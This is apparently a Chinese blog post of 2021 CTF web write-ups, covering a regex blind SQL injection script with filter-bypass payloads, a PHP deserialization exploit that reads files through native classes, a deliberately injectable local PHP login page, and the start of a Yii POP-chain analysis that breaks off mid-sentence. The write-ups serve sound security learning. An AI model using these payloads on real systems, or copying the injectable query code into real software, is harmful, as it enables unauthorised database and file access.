



<!DOCTYPE html>
<html lang="cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="暮间的花园" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="暮间的花园" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="暮间的花园" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="writeup" />


<link rel="canonical" href="http://example.com/2021/09/28/(2)check_in_wp/">



  <title>
2021下半年的一些比赛部分题解 |
Yume Shoka = 暮间的花园</title>
<meta name="generator" content="Hexo 6.0.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">2021下半年的一些比赛部分题解
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2021-09-28 13:13:53">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2021-09-28T13:13:53+08:00">2021-09-28</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicm0fdw5cj20zk0m8hdt.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeu1usa7j20zk0m8b29.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipevgoki5j20zk0m84qp.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclwuom7cj20zk0m8dvn.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclgi503lj20zk0m8hdt.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipexoj0moj20zk0m8kgu.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="cn">
  <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/28/(2)check_in_wp/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="muhua">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="暮间的花园">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="MTCTF-初赛-2021"><a href="#MTCTF-初赛-2021" class="headerlink" title="MTCTF 初赛(2021)"></a>MTCTF 初赛(2021)</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_hex</span>(<span class="params">litter</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> litter:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x5e&#x27;</span> + <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">string = string.ascii_lowercase + string.ascii_uppercase + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        url = <span class="string">&#x27;url&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;Null\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;||(`password`/**/regexp/**/binary/**/&#123;&#125;)#&#x27;</span>.<span class="built_in">format</span>(str_hex(flag+j))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>正则盲注</p>
<!-- （~~之前都没听说过的，总之开始学辣~~） -->
<p>先看题，ban掉了select，空格等</p>
<!-- ，差不多忘了。 -->
<!-- (~~但学长tql，所以我就等着赛后看学长wp复现辣~~) -->
<p>言归正传，总之这个题的绕过规则</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password字段：1&#x27;\</span><br><span class="line">username字段：||(1)/**/in/**/(1)#</span><br></pre></td></tr></table></figure>
<p>不过很可惜环境已经没了，所以我就云复现了，不过我记得通过上述规则绕过后虽然不能登录成功，但页面上会显示<code>flag not in here</code>，因此可以通过这个来进行盲注，但好像if和sleep之类的也ban了还是不起作用，总之，选择知道这个正则匹配可以查到那就继续吧</p>
<p>本地尝试正则盲注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from liu_tbl where liu_ling=1||`liu_ling` regexp binary 8;  </span><br></pre></td></tr></table></figure>
<p>终于在本地搞出来了，确实一跑就出，虽然在知道字段名的时候怎么实现明白了，但获取字段名，表名等的方法还不知道。<br>以下是测试界面的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;muhua的测试&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;style.css&quot;</span>/&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;(测试)&lt;/h1&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">（账号）：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">（密码）：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=login&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;linkstart-liu.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password =&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$conn</span> , <span class="string">&#x27;supersql&#x27;</span>);</span><br><span class="line"><span class="variable">$retval</span>=<span class="title function_ invoke__">mysqli_query</span>( <span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$retval</span>, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag not in here&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$uername</span>==admin &amp;&amp; <span class="variable">$password</span>==<span class="string">&#x27;This_1s_Passw0rd&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ctfdie&#123;anfoef3wg-vniir8nb-8nnjdmkl&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>部分信息改成自己的数据库信息就能用了，我搞云复现不太行，万一云半天结果是错的我就惨了，所以写了个页面来测试。<br>总之又学到一点点。<br>正则匹配<code>regexp</code>功能类似<code>like</code>，但如果在查询的字符串前加上<code>^</code>，regexp就会只匹配到以该字符串作为开头的字符串，但这是不区分大小写的匹配，所以为了精确，还要加上<code>binary</code>。<br>有一个学习链接，虽然很容易懂，但链接不能没有：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcG9sb3l5L3AvMTI4ODgwMzkuaHRtbA==">地址</span></p>
<h1 id="第五届XMAN选拔赛-2021"><a href="#第五届XMAN选拔赛-2021" class="headerlink" title="第五届XMAN选拔赛(2021)"></a>第五届XMAN选拔赛(2021)</h1><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>打开环境，直接给出了源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = &quot;<span class="title">Hel</span>&quot;;</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">para</span> = &quot;<span class="title">xctfer</span>&quot;;</span></span><br><span class="line"><span class="class">        <span class="title">echo</span> <span class="title">new</span>  $<span class="title">this</span>-&gt;<span class="title">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__wakeup</span>()</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check = <span class="keyword">new</span> Filter;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">vaild</span>(<span class="variable language_">$this</span>-&gt;para) &amp;&amp; <span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">vaild</span>(<span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>)) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">        <span class="title">else</span></span></span><br><span class="line"><span class="class">            <span class="title">die</span>(&#x27;<span class="title">what</span>?<span class="title">Really</span>?&#x27;);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Hel</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;Hello bro, I guess you are a lazy &quot;</span>.<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> XMAN;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>给出了反序列化，但类里面却没有可以利用的危险函数，而且能控制的只有这样一句</p>
<p><code>echo new  $this-&gt;class ($this-&gt;para);</code></p>
<p>可以生成一个类并且能控制参数，但源码的类里面没有可以进行文件读取或者代码执行的地方，赛后从三月七师傅处得知可以构造php原生类进行目录查询和文件读取，通过类<code>FilesystemIterator</code>和<code>SplFileObject</code>可以分别进行目录查询和文件读取</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> XMAN;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="class"><span class="keyword">class</span> = &quot;<span class="title">SplFileObject</span>&quot;/*&quot;<span class="title">FilesystemIterator</span>&quot;*/;</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">para</span> = &quot;./<span class="title">xxxXXXmMManNNn</span>/<span class="title">f1a4</span>.<span class="title">php</span>&quot;;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>($<span class="title">a</span>));</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">/*以下是目录查询方法，将目录全部展示，如果不进行$<span class="title">iterator</span>-&gt;<span class="title">next</span>()就只能读取目录下第一格内容</span></span><br><span class="line"><span class="class"><span class="title">error_reporting</span>(0);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">iterator</span> = <span class="title">new</span> <span class="title">FilesystemIterator</span>(&#x27;.&#x27;);  // 创建当前目录的迭代器</span></span><br><span class="line"><span class="class"> </span></span><br><span class="line"><span class="class"><span class="title">while</span> ($<span class="title">iterator</span>-&gt;<span class="title">valid</span>()) </span>&#123; <span class="comment">// 检测迭代器是否到底了</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$iterator</span>-&gt;<span class="title function_ invoke__">getFilename</span>(), <span class="string">&#x27;:&#x27;</span>, <span class="variable">$iterator</span>-&gt;<span class="title function_ invoke__">getCTime</span>(), PHP_EOL;</span><br><span class="line">    <span class="variable">$iterator</span>-&gt;<span class="title function_ invoke__">next</span>();  <span class="comment">// 游标往后移动</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造<code>FilesystemIterator(&quot;.&quot;)</code>获取当前目录第一个内容，得到<code>xxxXXXmMManNNn</code>，打开该文件夹得到<code>f1a4.php</code>，通过<code>SplFileObject(&quot;./xxxXXXmMManNNn/f1a4.php&quot;)</code>，该类还可以通过控制第二个和第三个参数来控制输出文件从第第二个参数的行数到第三个参数的行数。</p>
<h1 id="祥云杯2021"><a href="#祥云杯2021" class="headerlink" title="祥云杯2021"></a>祥云杯2021</h1><h2 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h2><p>下载附件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myloader</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;./class/&#x27;</span> . (<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$class</span>) . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(<span class="string">&quot;myloader&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;某ii最新的某条链子&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>包含了class里面的php文件，找到入口：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#RunProcess.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [<span class="string">&#x27;sleep&#x27;</span> =&gt; <span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="built_in">static</span> <span class="variable">$events</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">stopProcess</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stopProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="title function_ invoke__">array_reverse</span>(<span class="variable language_">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;<span class="title function_ invoke__">isRunning</span>()) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;output-&gt;<span class="title function_ invoke__">debug</span>(<span class="string">&#x27;[RunProcess] Stopping &#x27;</span> . <span class="variable">$process</span>-&gt;<span class="title function_ invoke__">getCommandLine</span>());</span><br><span class="line">            <span class="variable">$process</span>-&gt;<span class="title function_ invoke__">stop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processes = [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>魔术方法<code>__destruct</code>里调用了<code>stopProcess</code>方法，<code>$this-&gt;output-&gt;debug(&#39;[RunProcess] Stopping &#39; . $process-&gt;getCommandLine());</code>，把<code>$process-&gt;getCommandLine()</code>作为字符串，如果这是一个类，就会触发类里的魔术变量<code>__tostring</code>，而这个属性是可控的，可以检索到<code>AppendStream.php</code>里有这个魔术方法： </p>
